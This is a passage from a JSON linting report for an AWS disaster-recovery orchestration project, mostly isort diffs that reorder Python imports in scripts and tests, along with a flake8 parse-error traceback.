  raise ParseError() from error\npydocstyle.parser.ParseError: Cannot parse file.\n\"\"\"\n\nThe above exception was the direct cause of the following exception:\n\nTraceback (most recent call last):\n  File \"<frozen runpy>\", line 198, in _run_module_as_main\n  File \"<frozen runpy>\", line 88, in _run_code\n  File \"/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8/__main__.py\", line 7, in <module>\n    raise SystemExit(main())\n                     ^^^^^^\n  File \"/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8/main/cli.py\", line 23, in main\n    app.run(argv)\n  File \"/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8/main/application.py\", line 198, in run\n    self._run(argv)\n  File \"/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8/main/application.py\", line 187, in _run\n    self.run_checks()\n  File \"/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8/main/application.py\", line 103, in run_checks\n    self.file_checker_manager.run()\n  File \"/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8/checker.py\", line 234, in run\n    self.run_parallel()\n  File \"/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/site-packages/flake8/checker.py\", line 203, in run_parallel\n    self.results = list(pool.imap_unordered(_mp_run, self.filenames))\n                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/Users/jocousen/.local/share/mise/installs/python/3.12.11/lib/python3.12/multiprocessing/pool.py\", line 873, in next\n    raise value\npydocstyle.parser.ParseError: Cannot parse file.\n",
      "return_code": 1
    },
    "isort": {
      "tool": "isort",
      "status": "failed",
      "files_checked": 53,
      "files_needing_sort": "unknown",
      "output": "--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/scripts/generate_quality_report.py:before\t2026-01-02 10:48:57.046555\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/scripts/generate_quality_report.py:after\t2026-01-02 10:49:05.653982\n@@ -15,10 +15,10 @@\n import os\n import subprocess\n import sys\n+import tempfile\n from datetime import datetime\n from pathlib import Path\n-from typing import Dict, List, Any, Optional\n-import tempfile\n+from typing import Any, Dict, List, Optional\n \n \n class QualityReporter:\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/scripts/monitor_lambda_drill.py:before\t2025-12-31 18:24:52.689952\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/scripts/monitor_lambda_drill.py:after\t2026-01-02 10:49:05.655347\n@@ -2,9 +2,11 @@\n \"\"\"\n Monitor Lambda drill execution and check for EC2 instance creation\n \"\"\"\n+import sys\n+import time\n+\n import boto3\n-import time\n-import sys\n+\n \n def monitor_execution(execution_id, plan_id, max_wait_minutes=10):\n     \"\"\"Monitor execution until completion or timeout\"\"\"\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/scripts/manage-user-roles.py:before\t2026-01-02 10:48:57.022040\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/scripts/manage-user-roles.py:after\t2026-01-02 10:49:05.657123\n@@ -5,10 +5,11 @@\n \"\"\"\n \n import argparse\n-import boto3\n import json\n import sys\n-from typing import List, Dict, Optional\n+from typing import Dict, List, Optional\n+\n+import boto3\n \n # DRS Role definitions matching CloudFormation template\n DRS_ROLES = {\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/scripts/add-current-account.py:before\t2026-01-02 10:48:56.975508\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/scripts/add-current-account.py:after\t2026-01-02 10:49:05.658475\n@@ -10,11 +10,12 @@\n     python3 scripts/add-current-account.py [--account-name \"My Account\"]\n \"\"\"\n \n-import boto3\n+import argparse\n import json\n import sys\n-import argparse\n from datetime import datetime\n+\n+import boto3\n \n \n def get_current_account_id():\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/scripts/test_drs_drill_trace.py:before\t2025-12-07 23:46:44.439485\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/scripts/test_drs_drill_trace.py:after\t2026-01-02 10:49:05.660269\n@@ -4,10 +4,11 @@\n Tests DRS recovery with detailed tracing to identify failure points\n \"\"\"\n \n+import json\n+import sys\n+import time\n+\n import boto3\n-import json\n-import time\n-import sys\n \n # Test configuration - using first 2 servers\n SOURCE_SERVER_IDS = ['s-3c1730a9e0771ea14', 's-3d75cdc0d9a28a725']  # EC2AMAZ-4IMB9PN, EC2AMAZ-RLP9U5V\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/monitor_execution.py:before\t2025-12-06 15:33:26.267757\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/monitor_execution.py:after\t2026-01-02 10:49:05.661616\n@@ -3,10 +3,12 @@\n Quick execution monitoring script\n Monitors a running DRS execution and displays real-time status\n \"\"\"\n+import sys\n+import time\n+from datetime import datetime\n+\n import boto3\n-import time\n-import sys\n-from datetime import datetime\n+\n \n def monitor_execution(execution_id: str, region: str = 'us-east-1'):\n     \"\"\"Monitor execution until completion\"\"\"\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/conftest.py:before\t2025-11-19 17:53:08.154386\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/conftest.py:after\t2026-01-02 10:49:05.663157\n@@ -2,11 +2,11 @@\n Pytest configuration and shared fixtures for execution engine tests.\n \"\"\"\n import os\n-import pytest\n-import boto3\n-from moto import mock_dynamodb, mock_stepfunctions, mock_sts, mock_ec2\n from typing import Generator\n \n+import boto3\n+import pytest\n+from moto import mock_dynamodb, mock_ec2, mock_stepfunctions, mock_sts\n \n # ============================================================================\n # Environment Setup\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/create_test_plan.py:before\t2025-11-20 21:56:07.792642\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/create_test_plan.py:after\t2026-01-02 10:49:05.664850\n@@ -2,9 +2,10 @@\n \"\"\"\n Create TEST Recovery Plan with actual Protection Groups for UI verification\n \"\"\"\n-import requests\n import json\n import os\n+\n+import requests\n from dotenv import load_dotenv\n \n # Load environment\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/test_drs_validation.py:before\t2025-11-20 21:56:07.795215\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/test_drs_validation.py:after\t2026-01-02 10:49:05.666659\n@@ -4,9 +4,10 @@\n Verifies that the API now rejects fake server IDs and only accepts real DRS servers.\n \"\"\"\n \n+import json\n+\n import boto3\n import requests\n-import json\n \n # Test Configuration\n API_ENDPOINT = \"https://9cowuz4azi.execute-api.us-east-1.amazonaws.com/test\"\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/monitor_drs_drill.py:before\t2025-11-30 00:34:16.021817\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/monitor_drs_drill.py:after\t2026-01-02 10:49:05.668851\n@@ -4,10 +4,12 @@\n Monitors a DRS drill job from initiation to completion\n \"\"\"\n \n-import boto3\n import json\n import time\n from datetime import datetime\n+\n+import boto3\n+\n \n def monitor_drill(job_id, timeout=1200):\n     \"\"\"Monitor DRS drill job with 30s polling\"\"\"\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/validate_setup.py:before\t2025-11-19 17:53:56.631855\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/validate_setup.py:after\t2026-01-02 10:49:05.669761\n@@ -3,8 +3,9 @@\n Validate test infrastructure setup.\n Run this script to verify all dependencies and configuration are correct.\n \"\"\"\n+import os\n import sys\n-import os\n+\n \n def check_python_version():\n     \"\"\"Verify Python version is 3.12+\"\"\"\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/standalone_drs_drill.py:before\t2025-11-30 00:34:16.023758\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/standalone_drs_drill.py:after\t2026-01-02 10:49:05.671967\n@@ -1,9 +1,11 @@\n #!/usr/bin/env python3\n-import boto3\n import json\n import time\n from datetime import datetime\n+\n+import boto3\n from botocore.exceptions import ClientError\n+\n \n def run_drs_drill(source_server_id=\"s-3c1730a9e0771ea14\", region=\"us-east-1\"):\n     \"\"\"\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/automated_e2e_test.py:before\t2025-12-06 15:02:33.632439\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/automated_e2e_test.py:after\t2026-01-02 10:49:05.674771\n@@ -4,12 +4,13 @@\n Triggers execution \u2192 Monitors DRS \u2192 Validates EC2 \u2192 Reports results\n \"\"\"\n import json\n+import logging\n import time\n+from datetime import datetime, timezone\n+from typing import Any, Dict, List, Optional\n+\n import boto3\n import requests\n-from datetime import datetime, timezone\n-from typing import Dict, Any, List, Optional\n-import logging\n \n # Configure logging\n logging.basicConfig(\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/test_with_lambda_invoke.py:before\t2025-11-30 00:34:16.029924\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/test_with_lambda_invoke.py:after\t2026-01-02 10:49:05.676322\n@@ -3,10 +3,11 @@\n Automated test using direct Lambda invocation (bypasses API Gateway auth)\n \"\"\"\n import json\n+import logging\n import time\n+from datetime import datetime, timezone\n+\n import boto3\n-from datetime import datetime, timezone\n-import logging\n \n logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')\n logger = logging.getLogger(__name__)\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/check_pg_response.py:before\t2025-11-20 21:56:07.791804\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/check_pg_response.py:after\t2026-01-02 10:49:05.677076\n@@ -1,8 +1,9 @@\n #!/usr/bin/env python3\n \"\"\"Check what Protection Groups API actually returns\"\"\"\n+import json\n+\n import boto3\n import requests\n-import json\n \n API_ENDPOINT = \"https://9cowuz4azi.execute-api.us-east-1.amazonaws.com/test\"\n USER_POOL_CLIENT_ID = \"48fk7bjefk88aejr1rc7dvmbv0\"\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/security/validate_framework.py:before\t2025-12-31 11:05:30.679971\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/security/validate_framework.py:after\t2026-01-02 10:49:05.678434\n@@ -8,9 +8,10 @@\n \"\"\"\n \n import json\n+import os\n import sys\n from pathlib import Path\n-import os\n+\n \n def validate_configuration():\n     \"\"\"Validate the security testing framework configuration\"\"\"\n@@ -81,8 +82,8 @@\n     # Check Python dependencies\n     try:\n         import boto3\n+        import jwt\n         import requests\n-        import jwt\n         print(\"\\n\ud83d\udce6 Dependencies:\")\n         print(\"   \u2705 boto3\")\n         print(\"   \u2705 requests\")\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/security/rbac_security_tests.py:before\t2025-12-31 12:23:48.163584\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/security/rbac_security_tests.py:after\t2026-01-02 10:49:05.683169\n@@ -8,19 +8,20 @@\n and detailed security reporting for AWS security teams.\n \"\"\"\n \n+import asyncio\n+import datetime\n import json\n-import asyncio\n import logging\n-import datetime\n-from typing import Dict, List, Any, Optional, Tuple\n-from dataclasses import dataclass, asdict\n+import time\n+import uuid\n+from dataclasses import asdict, dataclass\n from enum import Enum\n+from pathlib import Path\n+from typing import Any, Dict, List, Optional, Tuple\n+\n import boto3\n+import jwt\n import requests\n-import jwt\n-from pathlib import Path\n-import uuid\n-import time\n \n # Configure logging\n logging.basicConfig(\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/security/demo_security_test.py:before\t2025-12-31 11:07:08.693329\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/security/demo_security_test.py:after\t2026-01-02 10:49:05.684873\n@@ -7,13 +7,13 @@\n by running a subset of security tests and generating a sample report.\n \"\"\"\n \n+import asyncio\n+import datetime\n import json\n-import asyncio\n import logging\n-import datetime\n+import os\n+import sys\n from pathlib import Path\n-import sys\n-import os\n \n # Add the current directory to Python path\n sys.path.append(str(Path(__file__).parent))\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/security/run_security_tests.py:before\t2025-12-31 11:41:48.411263\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/security/run_security_tests.py:after\t2026-01-02 10:49:05.687323\n@@ -15,15 +15,16 @@\n import asyncio\n import json\n import logging\n+import os\n import sys\n+from datetime import datetime\n from pathlib import Path\n-from datetime import datetime\n-import os\n \n # Add the current directory to Python path\n sys.path.append(str(Path(__file__).parent))\n \n from rbac_security_tests import RBACSecurityTester, RiskLevel, TestStatus\n+\n \n # Custom JSON encoder to handle enums\n class SecurityReportEncoder(json.JSONEncoder):\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/mocks/mock_drs_client.py:before\t2025-11-19 18:06:23.392855\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/mocks/mock_drs_client.py:after\t2026-01-02 10:49:05.689874\n@@ -4,8 +4,8 @@\n \"\"\"\n import time\n import uuid\n-from typing import Dict, List, Any, Optional\n from datetime import datetime, timedelta\n+from typing import Any, Dict, List, Optional\n \n \n class ThrottlingException(Exception):\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/unit/test_data_generator.py:before\t2025-11-19 18:10:05.843339\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/unit/test_data_generator.py:after\t2026-01-02 10:49:05.692023\n@@ -2,23 +2,24 @@\n Unit tests for test data generators.\n Validates that generators produce valid data structures.\n \"\"\"\n+import re\n+\n import pytest\n-import re\n from utils.test_data_generator import (\n+    generate_account_id,\n+    generate_complex_plan,\n+    generate_execution_history,\n+    generate_instance_id,\n+    generate_job_id,\n+    generate_multiple_executions,\n+    generate_parallel_plan,\n+    generate_protection_group,\n+    generate_random_string,\n+    generate_recovery_plan,\n+    generate_sequential_plan,\n     generate_server_id,\n     generate_server_ids,\n-    generate_recovery_plan,\n-    generate_execution_history,\n-    generate_multiple_executions,\n-    generate_protection_group,\n-    generate_random_string,\n-    generate_account_id,\n-    generate_instance_id,\n-    generate_job_id,\n     generate_simple_plan,\n-    generate_complex_plan,\n-    generate_parallel_plan,\n-    generate_sequential_plan\n )\n \n \n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/unit/test_drs_service_limits.py:before\t2025-12-09 22:47:45.847910\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/unit/test_drs_service_limits.py:after\t2026-01-02 10:49:05.696665\n@@ -12,10 +12,11 @@\n - MAX_SOURCE_SERVERS: 4000 (soft limit, can request increase)\n \"\"\"\n \n+import os\n+import sys\n+from unittest.mock import MagicMock, patch\n+\n import pytest\n-import sys\n-import os\n-from unittest.mock import patch, MagicMock\n \n # Add lambda directory to path for imports\n sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', '..', 'lambda'))\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/unit/test_infrastructure_smoke.py:before\t2025-11-19 17:57:38.302874\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/unit/test_infrastructure_smoke.py:after\t2026-01-02 10:49:05.697763\n@@ -2,7 +2,8 @@\n Smoke test to verify test infrastructure is working correctly.\n \"\"\"\n import pytest\n-from hypothesis import given, strategies as st\n+from hypothesis import given\n+from hypothesis import strategies as st\n \n \n @pytest.mark.unit\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/unit/test_wave_transformation.py:before\t2025-11-19 20:33:36.092198\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/unit/test_wave_transformation.py:after\t2026-01-02 10:49:05.699676\n@@ -3,9 +3,10 @@\n Tests the critical bug fix for ServerIds type handling\n \"\"\"\n \n+import os\n+import sys\n+\n import pytest\n-import sys\n-import os\n \n # Set up environment variables BEFORE importing index\n os.environ[\"AWS_DEFAULT_REGION\"] = \"us-east-1\"\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/unit/test_fixtures.py:before\t2025-11-19 18:02:44.304167\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/unit/test_fixtures.py:after\t2026-01-02 10:49:05.701239\n@@ -4,16 +4,16 @@\n \"\"\"\n import pytest\n from fixtures.recovery_plan_fixtures import (\n-    create_single_wave_plan,\n-    create_three_wave_plan,\n     create_five_wave_plan,\n+    create_mixed_execution_plan,\n     create_parallel_wave_plan,\n-    create_mixed_execution_plan,\n     create_plan_with_transitive_dependencies,\n     create_plan_with_wait_times,\n     create_real_drs_server_plan,\n+    create_single_wave_plan,\n+    create_three_wave_plan,\n     get_all_fixtures,\n-    get_fixture\n+    get_fixture,\n )\n \n \n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/unit/test_mock_drs_client.py:before\t2025-11-19 18:07:00.671815\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/unit/test_mock_drs_client.py:after\t2026-01-02 10:49:05.703264\n@@ -2,14 +2,15 @@\n Unit tests for MockDRSClient.\n Validates that the mock DRS client behaves correctly.\n \"\"\"\n+import time\n+\n import pytest\n-import time\n from mocks.mock_drs_client import (\n     MockDRSClient,\n-    ThrottlingException,\n     ResourceNotFoundException,\n     ServiceUnavailableException,\n-    create_mock_drs_client\n+    ThrottlingException,\n+    create_mock_drs_client,\n )\n \n \n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/unit/test_recovery_plan_delete.py:before\t2025-11-19 20:34:19.092799\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/unit/test_recovery_plan_delete.py:after\t2026-01-02 10:49:05.704948\n@@ -3,10 +3,11 @@\n Tests the critical bug fix for execution history query with GSI fallback\n \"\"\"\n \n+import os\n+import sys\n+from unittest.mock import MagicMock, patch\n+\n import pytest\n-import sys\n-import os\n-from unittest.mock import MagicMock, patch\n from botocore.exceptions import ClientError\n \n # Set up environment variables BEFORE importing index\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/utils/test_data_generator.py:before\t2025-11-19 18:12:54.078491\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/utils/test_data_generator.py:after\t2026-01-02 10:49:05.706955\n@@ -6,7 +6,7 @@\n import string\n import time\n import uuid\n-from typing import Dict, List, Any, Optional\n+from typing import Any, Dict, List, Optional\n \n \n def generate_server_id() -> str:\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/fixtures/recovery_plan_fixtures.py:before\t2025-11-19 18:01:55.326276\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/fixtures/recovery_plan_fixtures.py:after\t2026-01-02 10:49:05.710256\n@@ -3,7 +3,7 @@\n Provides sample recovery plans with various wave configurations.\n \"\"\"\n import time\n-from typing import Dict, List, Any\n+from typing import Any, Dict, List\n \n \n def create_single_wave_plan(\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/e2e/test_recovery_plan_bugs.py:before\t2025-11-20 21:56:07.496359\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/e2e/test_recovery_plan_bugs.py:after\t2026-01-02 10:49:05.711618\n@@ -2,11 +2,12 @@\n E2E API Test: Validate P1 Bug Fixes\n Tests both Wave transformation and Delete performance bugs are fixed.\n \"\"\"\n+import json\n import os\n-import json\n+from typing import Any, Dict\n+\n+import pytest\n import requests\n-import pytest\n-from typing import Dict, Any\n \n # API Configuration\n API_BASE_URL = os.getenv('API_BASE_URL', 'https://etv40zymeg.execute-api.us-east-1.amazonaws.com/test')\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/e2e/test_protection_group_crud.py:before\t2025-11-20 21:56:07.793458\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/e2e/test_protection_group_crud.py:after\t2026-01-02 10:49:05.713031\n@@ -3,11 +3,12 @@\n E2E API Test for Protection Groups CRUD Operations\n Tests POST, GET, PUT, DELETE methods and name uniqueness validation\n \"\"\"\n-import boto3\n-import requests\n import json\n import sys\n import time\n+\n+import boto3\n+import requests\n \n # Config - UPDATE THESE AFTER DEPLOYMENT\n USER_POOL_ID = 'us-east-1_jKbDOFre2'  # From stack outputs\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/e2e/test_recovery_plan_e2e.py:before\t2025-11-20 21:56:07.794884\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/e2e/test_recovery_plan_e2e.py:after\t2026-01-02 10:49:05.714724\n@@ -3,11 +3,12 @@\n End-to-End Recovery Plan Testing\n Tests complete CRUD operations: Create, Read, Update, Delete\n \"\"\"\n-import boto3\n-import requests\n import json\n import sys\n import time\n+\n+import boto3\n+import requests\n \n # Config\n USER_POOL_ID = 'us-east-1_S3wvMGaT0'\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/e2e/get_auth_token.py:before\t2025-11-20 21:56:07.496052\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/e2e/get_auth_token.py:after\t2026-01-02 10:49:05.715863\n@@ -3,8 +3,9 @@\n Helper script to get ID token for E2E API testing.\n Uses Cognito credentials to authenticate and retrieve ID token.\n \"\"\"\n+import json\n import os\n-import json\n+\n import boto3\n from botocore.exceptions import ClientError\n \n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/e2e/test_recovery_plan_api_crud.py:before\t2025-11-20 21:56:07.794299\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/e2e/test_recovery_plan_api_crud.py:after\t2026-01-02 10:49:05.717425\n@@ -8,11 +8,12 @@\n 4. Delete Recovery Plan\n \"\"\"\n \n+import json\n+from typing import Dict, List\n+\n import boto3\n+import pytest\n import requests\n-import json\n-import pytest\n-from typing import Dict, List\n \n # Test Configuration\n API_ENDPOINT = \"https://9cowuz4azi.execute-api.us-east-1.amazonaws.com/test\"\n--- /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/e2e/test_protection_groups_fix.py:before\t2025-11-20 21:56:07.793861\n+++ /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/e2e/test_protection_groups_fix.py:after\t2026-01-02 10:49:05.718571\n@@ -3,10 +3,11 @@\n Automated API test for Protection Groups selection fix\n Tests that Protection Groups have SourceServerIds field populated\n \"\"\"\n+import json\n+import sys\n+\n import boto3\n import requests\n-import json\n-import sys\n \n # Config\n USER_POOL_ID = 'us-east-1_S3wvMGaT0'\n",
      "errors": "ERROR: /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/scripts/generate_quality_report.py Imports are incorrectly sorted and/or formatted.\nERROR: /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/scripts/monitor_lambda_drill.py Imports are incorrectly sorted and/or formatted.\nERROR: /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/scripts/manage-user-roles.py Imports are incorrectly sorted and/or formatted.\nERROR: /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/scripts/add-current-account.py Imports are incorrectly sorted and/or formatted.\nERROR: /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/scripts/test_drs_drill_trace.py Imports are incorrectly sorted and/or formatted.\nERROR: /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/monitor_execution.py Imports are incorrectly sorted and/or formatted.\nERROR: /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/conftest.py Imports are incorrectly sorted and/or formatted.\nERROR: /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/create_test_plan.py Imports are incorrectly sorted and/or formatted.\nERROR: /Users/jocousen/Library/CloudStorage/OneDrive-amazon.com/DOCUMENTS/CODE/GITHUB/AWS-DRS-Orchestration/tests/python/test_drs_validation.py Imports are incorrectly sorted and/or formatted.\nERROR: 